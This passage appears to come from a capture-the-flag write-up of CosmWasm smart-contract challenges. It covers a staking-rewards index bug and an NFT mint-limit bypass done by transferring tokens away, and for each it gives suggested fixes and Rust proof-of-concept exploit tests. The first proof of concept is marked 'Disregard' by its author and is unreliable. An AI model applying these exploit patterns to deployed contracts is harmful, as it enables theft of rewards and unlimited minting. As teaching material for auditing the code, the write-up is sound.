them after, and then you will be able to claim an increased rewards amount.

### Recommendation

Verify the token address so they can't just pass in a fake one?
Update the user_index in all cases, so that users aren't able to claim rewards from previous staking periods
(+by extension a larger share of the current staking)
```rust
pub fn update_rewards(user: &mut UserRewardInfo, state: &State) {
    // calculate pending rewards
    let reward = (state.global_index - user.user_index) * user.staked_amount;
    user.pending_rewards += reward;

    user.user_index = state.global_index;
}
```

### Proof of concept

Disregard lol

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // sandwich
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        let user_info_before: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();

        // sandwich
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        let user_info_after: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();
        // our shares should only be 5_000
        assert_eq!(user_info_after.pending_rewards, Uint128::new(10_000));
        let didincrease: bool = user_info_after.pending_rewards > user_info_before.pending_rewards;
        assert_eq!(didincrease, true);

        // user2 claim rewards
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // user2 receives reward denom
        let balance = app
            .wrap()
            .query_balance(USER2.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;

        assert_eq!(balance, user_info_after.pending_rewards);
    }
```

---

## Challenge 10: *Mistilteinn*

### Description

Public blockchains are a superpower because they free us from platform and vendor lock-in.
Your prized artwork, pfps, game items, etc. can go with you wherever you want and you can
use as many private keys you want. Including these nice whitelisted, 1/3 nfts we have here.
The mint doesn't account for this. This is how it checks that mint_per_user hasn't been
exceeded (under mint() in contract.rs):
```rust
    let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
        config.nft_contract.to_string(),
        &Cw721QueryMsg::Tokens::<Empty> {
            owner: info.sender.to_string(),
            start_after: None,
            limit: None,
        },
    )?;

    // ensure mint per user limit is not exceeded
    if tokens_response.tokens.len() >= config.mint_per_user as usize {
        return Err(ContractError::MaxLimitExceeded {});
    }
```
If we simply transfer the nft elsewhere, then tokens.len() will decrease, and we can keep minting!

### Recommendation

I think that the amount minted to a whitelisted user must be kept in contract storage
```rust
pub const MINTED: Map<&Addr, Uint128> = Map::new("minted");
```

then you can load it inside of mint(), increment after a successful minting, and save

(something like this)
```rust
pub fn mint(deps: DepsMut, _env: Env, info: MessageInfo) -> Result<Response, ContractError> {
    let mut config = CONFIG.load(deps.storage)?;

    // check user is in whitelist
    let users = WHITELIST.load(deps.storage)?.users;
    let is_whitelisted = users.iter().any(|user| user == &info.sender.to_string());
    if !is_whitelisted {
        return Err(ContractError::NotWhitelisted {});
    }
    let mut minted = MINTED.load(deps.storage, &info.sender)?;

    let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
        config.nft_contract.to_string(),
        &Cw721QueryMsg::Tokens::<Empty> {
            owner: info.sender.to_string(),
            start_after: None,
            limit: None,
        },
    )?;

    // ensure mint per user limit is not exceeded
    if minted.u128() >= config.mint_per_user as u128 {
        return Err(ContractError::MaxLimitExceeded {});
    }

    let token_id = config.total_tokens;

    let msg = CosmosMsg::Wasm(WasmMsg::Execute {
        contract_addr: config.nft_contract.to_string(),
        msg: to_binary(&Cw721ExecuteMsg::Mint::<Empty, Empty> {
            token_id: token_id.to_string(),
            owner: info.sender.to_string(),
            token_uri: None,
            extension: Empty {},
        })?,
        funds: vec![],
    });

    // increment users minted tokens
    minted += 1;

    // increment total tokens
    config.total_tokens += 1;
    CONFIG.save(deps.storage, &config)?;
    MINTED.save(deps.storage, &info.sender, &minted)?;

    Ok(Response::new()
        .add_attribute("action", "mint")
        .add_attribute("recipient", info.sender.to_string())
        .add_attribute("token_id", token_id.to_string())
        .add_message(msg))
}
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();


        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        let user4 = "user4";

        for _ in 1..51 {
            // query config
            let config: Config = app
                .wrap()
                .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
                .unwrap();

            // exceed max limit
            assert_eq!(config.mint_per_user, 3);

            let token_id = config.total_tokens;
            // i will mint as many as i want
            // the mintoooor
            app.execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::Mint {},
                &[],
            ).unwrap();

            // transfer it so we can keep minting
            app.execute_contract(
                Addr::unchecked(USER1),
                config.nft_contract.clone(),
                &cw721_base::msg::ExecuteMsg::TransferNft::<Empty, Empty> {
                    recipient: user4.to_string(),
                    token_id: token_id.to_string(),
                },
                &[],
            ).unwrap();
        }

        // ensure total tokens increases
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        // now lots have been minted
        assert_eq!(config.total_tokens, 50);
    }
```
